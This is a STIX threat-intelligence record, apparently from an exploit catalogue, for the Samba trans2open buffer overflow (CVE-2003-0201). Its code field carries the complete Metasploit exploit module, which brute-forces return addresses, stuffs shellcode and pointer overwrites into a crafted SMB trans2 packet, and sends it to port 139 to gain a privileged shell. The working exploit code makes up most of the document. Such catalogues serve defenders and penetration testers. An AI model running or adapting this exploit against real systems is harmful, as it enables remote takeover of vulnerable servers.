{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8247b92e-ed9b-489e-82fa-7af3043f319e",
    "created": "2024-08-14T16:56:59.348901Z",
    "modified": "2024-08-14T16:56:59.348905Z",
    "name": "Samba trans2open Overflow (Linux x86)",
    "description": " This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set.  NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/samba/trans2open.rb",
            "external_id": "trans2open.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0201"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2003/Apr/103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba trans2open Overflow (Linux x86)',\n      'Description'    => %q{\n          This exploits the buffer overflow found in Samba versions\n        2.2.0 to 2.2.8. This particular module is capable of\n        exploiting the flaw on x86 Linux systems that do not\n        have the noexec stack option set.\n\n        NOTE: Some older versions of RedHat do not seem to be vulnerable\n        since they apparently do not allow anonymous access to IPC.\n      },\n      'Author'         => [ 'hdm', 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0201' ],\n          [ 'OSVDB', '4469' ],\n          [ 'BID', '7294' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2003/Apr/103' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'MinNops'  => 512,\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          # tested OK - jjd:\n          # RedHat 7.2 samba-2.2.1a-4 - 0xbffffafc\n          # RedHat 9.0 samba-2.2.7a-7.9.0 - 0xbfffddfc\n          [ 'Samba 2.2.x - Bruteforce',\n            {\n              'PtrToNonZero' => 0xbffffff4, # near the bottom of the stack\n              'Offset'       => 1055,\n              'Bruteforce'   =>\n                {\n                  'Start' => { 'Ret' => 0xbffffdfc },\n                  'Stop'  => { 'Ret' => 0xbfa00000 },\n                  'Step'  => 256\n                }\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-04-07'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(139)\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def brute_exploit(addrs)\n\n    curr_ret = addrs['Ret']\n    begin\n      print_status(\"Trying return address 0x%.8x...\" %  curr_ret)\n\n      vprint_status('Connect with SMB1 since it needs native_lm info')\n      connect(versions: [1])\n      smb_login\n\n      if ! @checked_peerlm\n        if smb_peer_lm !~ /samba/i\n          fail_with(Failure::NoTarget, \"This target is not a Samba server (#{smb_peer_lm}\")\n        end\n\n        if smb_peer_lm =~ /Samba [34]\\./i\n          fail_with(Failure::NoTarget, \"This target is not a vulnerable Samba server (#{smb_peer_lm})\")\n        end\n      end\n\n      @checked_peerlm = true\n\n\n      # This value *must* be 1988 to allow findrecv shellcode to work\n      # XXX: I'm not sure the above comment is true...\n      pattern = rand_text_english(1988)\n\n      # See the OSX and Solaris versions of this module for additional\n      # information.\n\n      # eip_off = 1071 - RH7.2 compiled with -ggdb instead of -O/-O2\n      # (rpmbuild -bp ; edited/reran config.status ; make)\n      eip_off = target['Offset']\n      ptr_to_non_zero = target['PtrToNonZero']\n\n      # Stuff the shellcode into the request\n      pattern[0, payload.encoded.length] = payload.encoded\n\n      # We want test true here, so we overwrite conn with a pointer\n      # to something non-zero.\n      #\n      # 222       if (IS_IPC(conn)) {\n      # 223          return(ERROR(ERRSRV,ERRaccess));\n      # 224       }\n      pattern[eip_off + 4, 4] = [ptr_to_non_zero - 0x30].pack('V')\n\n      # We want to avoid crashing on the following two derefences.\n      #\n      # 116     int error_packet(char *inbuf,char *outbuf,int error_class,uint32 error_code,int line)\n      # 117     {\n      # 118       int outsize = set_message(outbuf,0,0,True);\n      # 119       int cmd = CVAL(inbuf,smb_com);\n      pattern[eip_off + 8, 4] = [ptr_to_non_zero - 0x08].pack('V')\n      pattern[eip_off + 12, 4] = [ptr_to_non_zero - 0x24].pack('V')\n\n      # This stream covers the framepointer and the return address\n      #pattern[1199, 400] = [curr_ret].pack('N') * 100\n      pattern[eip_off, 4] = [curr_ret].pack('V')\n\n      trans =\n        \"\\x00\\x04\\x08\\x20\\xff\\x53\\x4d\\x42\\x32\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"+\n        \"\\x64\\x00\\x00\\x00\\x00\\xd0\\x07\\x0c\\x00\\xd0\\x07\\x0c\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd0\\x07\\x43\\x00\\x0c\\x00\\x14\\x08\\x01\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\"+\n        pattern\n\n      # puts \"press any key\"; $stdin.gets\n\n      sock.put(trans)\n      handler\n\n    rescue ::EOFError\n    rescue ::Rex::Proto::SMB::Exceptions::LoginError, ::Interrupt, ::RuntimeError\n      raise $!\n    rescue ::Exception => e\n      print_error(\"#{rhost} #{e}\")\n    end\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-04-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}